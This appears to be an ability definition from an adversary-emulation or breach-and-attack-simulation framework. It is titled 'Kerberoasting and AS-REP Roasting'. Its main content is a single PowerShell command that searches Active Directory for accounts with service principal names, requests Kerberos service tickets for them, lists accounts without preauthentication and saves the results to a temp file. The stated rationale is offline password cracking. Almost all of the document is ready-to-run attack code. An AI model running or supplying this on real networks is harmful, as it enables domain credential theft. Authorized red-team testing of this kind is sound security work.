ability.name: Kerberoasting and AS-REP Roasting
ability.description: Requests Kerberos tickets for accounts with SPNs and checks for users with DONT_REQ_PREAUTH.

stages.command_template: $d='C:\\Windows\\Temp\\bas\\cred_access'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { $hashes = @(); $searcher = [adsisearcher]'(samAccountType=805306368)'; $searcher.PageSize = 1000; $users = $searcher.FindAll(); foreach ($u in $users) { if ($u.Properties.serviceprincipalname) { $sam = $u.Properties.samaccountname[0]; foreach ($spn in $u.Properties.serviceprincipalname) { try { Add-Type -AssemblyName System.IdentityModel; $req = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; $hashes += \"KERBEROASTED: SPN=$spn User=$sam\" } catch { $hashes += \"FAILED: SPN=$spn User=$sam Error=$($_.Exception.Message)\" } } } }; $asrepSearcher = [adsisearcher]'(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'; foreach ($u in $asrepSearcher.FindAll()) { $hashes += \"AS-REP ROASTABLE: User=$($u.Properties.samaccountname[0])\" }; $hashes -join [char]13+[char]10 } catch { \"ERROR: $_\" }) | Tee-Object -FilePath $d\\tickets.txt

rationale: Identifies service accounts and roastable accounts within the domain to offline-crack passwords.
